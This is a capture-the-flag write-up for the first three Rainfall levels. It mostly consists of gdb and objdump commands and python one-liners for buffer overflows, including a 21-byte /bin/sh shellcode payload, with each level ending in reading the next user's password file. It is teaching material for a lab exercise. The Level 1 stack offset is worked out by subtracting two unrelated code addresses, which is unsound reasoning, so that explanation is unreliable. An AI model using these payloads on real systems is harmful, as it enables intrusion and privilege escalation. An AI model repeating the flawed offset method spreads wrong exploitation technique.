# Rainfall

---

## Introduction

Welcome to **Rainfall**, the continuation of **snow-crash**, a series of hands-on challenges in cyber security. Each level presents a unique puzzle or exploit that you must solve to uncover a hidden flag and progress to the next challenge. Whether you're a beginner or an experienced hacker, these exercises are designed to sharpen your problem-solving skills and broaden your knowledge of various cyber security concepts.

|<h1>Cyber Security</h1>|
|-|
| <img width="500px" src="https://www.asylas.com/asylas/security-memes-our-year-end-humor-break/" alt="Cyber Security Meme"> |


<details>
<summary>Notes:</summary>

Registers: Think of registers like small, very fast storage spaces inside the CPU. The key registers we’ll see here are:

    ebp (Base Pointer): Used to mark the start of the current function’s stack frame (a region of memory for the function’s variables).
    esp (Stack Pointer): Points to the top of the stack (a dynamic region of memory where temporary data is stored and managed).
    eax, edx: General-purpose registers used for calculations and temporarily holding values.

Stack: A stack is like a pile of plates. You can only add (push) or remove (pop) plates from the top. It’s used to keep track of function calls, local variables, and temporary data.

Instructions: Assembly instructions are commands to the CPU. For example:

    push: Places (stores) a value on the stack.
    mov: Moves data from one place to another (e.g., from a register to memory or vice versa).
    call: Jumps to another function.
    ret: Returns from a function.
</details>

---

## ![Level 0](https://img.shields.io/badge/Level-0-blue) Disassemble the Memory

![Disassemble the Memory](https://img.shields.io/badge/Disassemble%20the%20memory-ASM-blue?style=for-the-badge&logo=lock)

**Description:** In this level, you need to disassemble the memory and identify an execution path that will reveal the password for the next level if the `cmp` condition is met.

### Steps:
1. **Load the Program into the Debugger**:
   ```bash
   gdb level0
   disas main
   ```
   You'll see something like:
   ```
   0x08048ed4 <+20>:   call   0x8049710 <atoi>
   >0x08048ed9 <+25>:  cmp    $0x1a7,%eax
   ```

2. **Convert the Comparison Value**:
   ```bash
   echo $((16#1a7)) # Output: 423
   ```

3. **Run the Program with the Correct Input**:
   ```bash
   ./level0 423
   ```

4. **Retrieve the Password**:
   ```bash
   whoami # level1
   cat /home/user/level1/.pass
   exit
   ```

---

## ![Level 1](https://img.shields.io/badge/Level-1-green) Buffer Overflow with `gets()`

![Buffer Overflow](https://img.shields.io/badge/Buffer%20Overflow%20gets()-clib-blue?style=for-the-badge&logo=lock)

**Description:** This level features a buffer overflow vulnerability in the unsafe `gets()` function. By exploiting this vulnerability, you can overwrite the stack and call the hidden `run()` function.

### Steps:
1. **Analyze the Program**:
   ```bash
   gdb level1
   i func # Look for 'run' function address (e.g., 0x08048444)
   disas main
   ```
   You’ll see:
   ```
   0x08048490 <+16>:   call   0x8048340 <gets@plt>
   ```

2. **Calculate the Offset**:
   ```bash
   echo $((0x08048490 - 0x08048444)) # Output: 76 bytes
   ```

3. **Test the Buffer Overflow**:
   ```bash
   (python -c 'print("A" * 76)'; cat -) | ./level1
   # Results in: Illegal instruction or segmentation fault
   ```

4. **Prepare the Exploit**:
   - Find the `run` function address:
     ```bash
     objdump -d ./level1 | grep run
     # Output: 08048444 <run>:
     ```

   - Execute the exploit:
     ```bash
     (python -c 'print("A" * 76 + "\x44\x84\x04\x08")'; cat -) | ./level1
     ```

5. **Retrieve the Password**:
   ```bash
   whoami # level2
   cat /home/user/level2/.pass
   exit
   ```

---

## ![Level 2](https://img.shields.io/badge/Level-2-yellow) Shellcode Injection

![Shellcode Injection](https://img.shields.io/badge/Shellcode-Injection-yellow?style=for-the-badge&logo=lock)

**Description:** This level features a buffer overflow vulnerability where you can inject shellcode into a buffer and overwrite the return address to execute it. The shellcode spawns a shell, allowing access to the next level.

### Steps:
1. **Analyze the Program**:
   ```bash
   objdump -d ./level2
   ```
   Look for:
   - Use of `gets()` to populate a buffer (e.g., 76 bytes on the stack).
   - Vulnerable return address checks.

2. **Prepare the Shellcode**:
   - Example shellcode to spawn `/bin/sh`:
     ```assembly
     "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
     ```
   - Shellcode length: **21 bytes**.

3. **Craft the Exploit**:
   - Fill the buffer with the shellcode, padding, and return address:
     ```bash
     (python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * (76 - 21 + 4) + "\x08\xa0\x04\x08")'; cat -) | ./level2
     ```

4. **Retrieve the Password**:
   ```bash
   whoami # level3
   cat /home/user/level3/.pass
   exit
   ```

---

## Conclusion

Rainfall challenges provide an engaging and hands-on way to learn about cyber security concepts such as:
- Buffer overflows
- Shellcode injection
- Binary disassembly
- Exploiting unsafe functions like `gets()`

Each level builds on the previous one, allowing you to gradually deepen your understanding of these critical vulnerabilities and how to exploit or prevent them.

Let’s continue breaking things responsibly and learning to build stronger systems!

---